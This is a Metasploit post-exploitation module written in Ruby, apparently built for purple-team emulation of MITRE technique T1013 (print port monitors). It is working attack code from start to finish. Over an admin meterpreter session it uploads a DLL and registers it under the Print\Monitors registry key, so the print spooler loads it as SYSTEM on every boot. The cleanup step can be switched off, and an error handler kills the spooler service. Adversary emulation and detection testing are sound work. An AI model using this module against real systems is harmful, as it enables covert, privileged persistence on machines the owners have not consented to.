##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry


  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Port Monitors (T1013) Windows - Purple Team',
        'Description'   => %q{
            Persistence, Privilege Escalation:
            A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. This DLL can be located in C:\Windows\System32
            and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.
            Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to
            HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors. The Registry key contains entries for the following:

            Local Port
            Standard TCP/IP Port
            USB Monitor
            WSD Port
            Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.

            Warning: the DLL that is uploaded will be caught by Windows Defender by default.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1013' ] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        # TODO: add API functionality
        OptString.new('METHOD', [true, "1=Registry, 2=API", "1"]),
        OptString.new('TARGET_PATH', [true, "Target path on remote system.", "C:\\t1013.dll"]),
        OptString.new('LOCAL_PATH', [true, "Local path of DLL for uploading.", Msf::Config.data_directory + "/purple/t1013/t1013_[x86|x64].dll"]),
        OptString.new('REG_KEY_NAME', [true, 'Set name of registry key', "Praetorian"]),
        OptString.new('REG_BASE_KEY', [true, "Base key for registry monitor. Defaults to print monitor.", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\"]),
        OptBool.new("CLEANUP", [true, "Cleanup files and keys after execution.", true])
      ])
  end


  def run
  #
  #
  #
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"
      raise "Module requires administrator rights" unless is_admin?

      if datastore["METHOD"] == "1"
        t1013_registry()
      elsif datastore["METHOD"] == "2"
        t1013_api()
      else
        raise "Invalid method of execution selected."
      end

      # cleanup handled in each method individually

      print_good("Module T1013W execution succesful.")

    rescue Rex::Post::Meterpreter::RequestError => e
      # this will pop up if the DLL got loaded and is in used by spoolsv.exe
      # kill the service and delete the dll
      client.run_cmd("pkill spoolsv")
      client.run_cmd("rm #{datastore['TARGET_PATH']}")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1013W execution failed.")
    end
  end


  def t1013_registry()
  #
  #
  #
    base_key = datastore["REG_BASE_KEY"]
    reg_name = datastore["REG_KEY_NAME"]
    local_file_path = datastore["LOCAL_PATH"]
    if local_file_path =~ /purple\/t1013\/t1013_/
      local_file_path.sub!(/\[x86\|x64\]/, (client.arch == ARCH_X86 ? "x86" : "x64"))
    end
    remote_file_path = datastore["TARGET_PATH"]

    # upload the DLL
    print_status("Uploading '#{local_file_path}' to '#{remote_file_path}'")
    upload_file(remote_file_path, local_file_path)

    # create the key which points to the dll
    print_status("Installing Print Monitor persistence...")
    registry_createkey(base_key + reg_name, REGISTRY_VIEW_NATIVE)
    registry_setvaldata(base_key + reg_name, "Driver", remote_file_path, "REG_SZ", REGISTRY_VIEW_NATIVE)

    # check to see that the key was created and has appropriate value
    if remote_file_path == registry_getvaldata(base_key + reg_name, "Driver")
      print_good("Key created.")
      print_good("To validate persistence, reboot the machine and check for 'C:\\t1013.txt'")
    else
      raise "Registry key creation failed."
    end

    if datastore['CLEANUP']
      print_warning("Cleaning up. This will remove the persistence!! (Have you tested execution?)")
      register_files_for_cleanup(remote_file_path)
      registry_deletekey(base_key + reg_name)
    end
  end


  def t1013_api()
  #
  #
  #
    raise(NotImplementedError, "Method not implemented.")
  end

end
